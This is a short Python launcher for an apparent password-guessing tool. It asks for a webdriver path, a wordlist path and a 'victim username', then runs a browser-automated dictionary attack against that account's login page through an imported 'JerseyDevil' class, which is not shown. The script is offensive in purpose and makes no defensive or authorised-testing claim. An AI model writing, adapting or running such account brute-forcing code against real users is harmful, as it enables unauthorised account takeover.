from jerseydevil import JerseyDevil

driverPATH = str(input("Enter your webdriver's PATH: "))
driverNAME = str(input("Enter your webdriver's name: "))
jersey = JerseyDevil(driverPATH, driverNAME)
try:
    dictPATH = str(input("Enter dictionary PATH: "))
except:
    print("There's an error with the PATH")
username = str(input("Enter victim username: "))
jersey.openPage()
jersey.dictionaryAttack(dictPATH, username)








